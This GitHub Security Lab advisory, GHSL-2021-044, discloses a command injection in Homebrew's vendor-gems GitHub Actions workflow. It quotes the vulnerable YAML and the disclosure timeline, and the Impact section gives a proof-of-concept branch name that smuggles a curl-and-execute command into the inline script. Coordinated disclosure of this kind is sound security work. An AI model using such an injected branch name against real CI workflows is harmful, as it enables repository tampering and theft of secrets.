<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">April 1, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-044: Command injection in a GitHub workflow of Homebrew/brew</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>2021-02-04: Issue reported to maintainer</li>
  <li>2021-02-04: Issue acknowledged</li>
  <li>2021-02-05: Issue fixed</li>
</ul>

<h2 id="summary">Summary</h2>

<p>The <a href="https://github.com/Homebrew/brew/blob/master/.github/workflows/vendor-gems.yml">vendor-gems.yml</a> GitHub workflow is vulnerable to command injection.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/Homebrew/brew">Homebrew/brew</a> repository</p>

<h2 id="tested-version">Tested Version</h2>

<p>The latest changeset of <a href="https://github.com/Homebrew/brew/blob/fd69a7407574c63e3de8faf782b1b8d494ef827d/.github/workflows/vendor-gems.yml">vendor-gems.yml</a> to date.</p>

<h2 id="details">Details</h2>

<h3 id="issue-a-branch-name-is-used-to-format-inline-script">Issue: A branch name is used to format inline script</h3>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">on</span><span class="pi">:</span>
  <span class="na">pull_request_target</span><span class="pi">:</span>
  <span class="na">workflow_dispatch</span><span class="pi">:</span>
    <span class="na">inputs</span><span class="pi">:</span>
      <span class="na">pull_request</span><span class="pi">:</span>
        <span class="na">description</span><span class="pi">:</span> <span class="s">Pull request number</span>
        <span class="na">required</span><span class="pi">:</span> <span class="no">true</span>

<span class="na">jobs</span><span class="pi">:</span>
  <span class="na">vendor-gems</span><span class="pi">:</span>
    <span class="na">if</span><span class="pi">:</span> <span class="pi">&gt;</span>
      <span class="s">startsWith(github.repository, 'Homebrew/') &amp;&amp; (</span>
        <span class="s">github.event_name == 'workflow_dispatch' || (</span>
          <span class="s">github.event.pull_request.user.login == 'dependabot[bot]' &amp;&amp;</span>
          <span class="s">contains(github.event.pull_request.title, '/Library/Homebrew')</span>
        <span class="s">)</span>
      <span class="s">)</span>
<span class="s">...</span>
        <span class="s">run</span><span class="pi">:</span> <span class="pi">|</span>
          <span class="s">gh pr checkout '${{ github.event.pull_request.number || github.event.inputs.pull_request }}'</span>
          <span class="s">branch="$(git branch --show-current)"</span>
          <span class="s">echo "::set-output name=branch::${branch}"</span>
          <span class="s">gem_name="$(echo "${branch}" | sed -E 's|.*/||;s|(.*)-.*$|\1|')"</span>
          <span class="s">echo "::set-output name=gem_name::${gem_name}"</span>
        <span class="na">env</span><span class="pi">:</span>
          <span class="na">GITHUB_TOKEN</span><span class="pi">:</span> <span class="s">${{ secrets.HOMEBREW_GITHUB_API_TOKEN }}</span>
      <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Vendor Gems</span>
        <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
          <span class="s">if [[ '${{ steps.checkout.outputs.gem_name }}' == 'sorbet' ]]; then</span>
            <span class="s">brew vendor-gems --update sorbet,sorbet-runtime</span>
          <span class="s">else</span>
            <span class="s">brew vendor-gems</span>
          <span class="s">fi</span>
</code></pre></div></div>

<p>A potentially untrusted branch name from pull request is used to format an inline script.</p>

<h4 id="impact">Impact</h4>

<p>An attacker may create a legitimate pull request. The workflow is vulnerable to arbitrary script injection which enables un-authorized modification of the base repository and secrets exfiltration if the repository owner is tricked into manually dispatching the workflow and doesn’t pay attention to the branch name the pull request comes from. A PoC of such a branch name would be: <code class="language-plaintext highlighter-rouge">long/text/here/a'==$($(curl${IFS}asdf.com))'a</code></p>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-044</code> in any communication regarding this issue.</p>


 